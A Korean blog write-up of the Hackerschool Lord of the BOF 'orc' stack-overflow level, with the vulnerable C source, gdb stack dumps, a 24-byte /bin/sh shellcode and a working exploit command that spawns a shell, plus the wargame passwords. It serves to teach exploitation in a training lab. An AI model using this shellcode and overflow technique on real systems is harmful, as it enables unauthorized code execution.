---
layout: post
title: "Hackerschool LOB-goblin"
categories: [Hackerschool-LOB]
tags: [pwnable]
redirect_from:
 - /2019/07/28/
---
```bash
login: goblin
Password:
Last login: Fri Jul 26 18:35:38 from 192.168.194.1
[goblin@localhost goblin]$ ls
orc  orc.c 
[goblin@localhost goblin]$ cat orc.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```
goblin/hackers proof로 로그인하자.
리눅스에서는 extern이라는 환경변수 자료형이 있다.
이를 이용해 environ이라는 변수를 선언하고, egghunter이라는 글 밑의 반복문에서 모든 환경변수를 초기화시킨다.
그 밑의 조건문에서는 인좌로 주는 글의 48번째가 bf가 되어야 한다는 이야기.
이 두개만 유의해서 풀면 된다.
우선 사용할 24byte짜리 쉘 코드.
```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
쉘 코드가 들어갈 주소값을 gdb로 확인하자.
```bash
[goblin@localhost goblin]$ cp orc.c tmp/
[goblin@localhost goblin]$ cd tmp
[goblin@localhost tmp]$ ls
orc.c
[goblin@localhost tmp]$ gcc -o orc orc.c
[goblin@localhost tmp]$ gdb -q orc
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,44
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
0x804850c <main+12>:    push   0x8048630
0x8048511 <main+17>:    call   0x8048410 <printf>
...
0x80485b9 <main+185>:   lea    %eax,[%ebp-40]
0x80485bc <main+188>:   push   %eax
0x80485bd <main+189>:   call   0x8048440 <strcpy>
0x80485c2 <main+194>:   add    %esp,8
0x80485c5 <main+197>:   lea    %eax,[%ebp-40]
0x80485c8 <main+200>:   push   %eax
0x80485c9 <main+201>:   push   0x8048659
0x80485ce <main+206>:   call   0x8048410 <printf>
0x80485d3 <main+211>:   add    %esp,8
0x80485d6 <main+214>:   leave
0x80485d7 <main+215>:   ret
(gdb) b*main+194
Breakpoint 1 at 0x80485c2

```
C 코드가 긴 만큼 어셈블리 코드도 길어서 중간에 생략하였다.
main+189에서 strcpy를 하는 것이 보인다.
그 바로 밑줄, main+194에 break를 걸자.
C 코드에서 인좌에 48번째에 \xbf여야 하므로, 그냥 \xbf 48개를 인좌로 보내버리자.
```bash
(gdb) r $(python -c 'print"\xbf"*48')
Starting program: /home/goblin/tmp/orc $(python -c 'print"\xbf"*48')

Breakpoint 1, 0x80485c2 in main ()
(gdb) x/300x $esp
0xbffffab4:     0xbffffac0      0xbffffc42      0x00000015      0xbfbfbfbf
0xbffffac4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffad4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffae4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x00000000

...
0xbffffc24:     0x00000000      0x36383669      0x6f682f00      0x672f656d
0xbffffc34:     0x696c626f      0x6d742f6e      0x726f2f70      0xbfbf0063
0xbffffc44:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffc54:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffc64:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x0000bfbf

```
밑에 bffffc44의 줄에 입력값이 다시 들어가는 것이 보인다.
그러므로 공격할 주소는 bffffc44로 하자.
코드는 nop*20+쉘 코드(24)+RET 덮어쓸 주소로 하자.
```bash
[goblin@localhost goblin]$ ./orc $(python -c 'print"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x44\xfc\xff\xbf"')
릱릱릱릱릱릱릱릱릱릱1픐h//shh/bin됥PS됣솻
                                         ?D??
bash$ my-pass
euid = 504
cantata
```
이 문제에서 코드중 48번째의 값은 RET의 가장 앞의 값이다.
LOB에서 배열의 주소값은 \xbf로 시작하므로 신경쓰지 않아도 되는 안전장치인 것이다.
goblin's password : "cantata"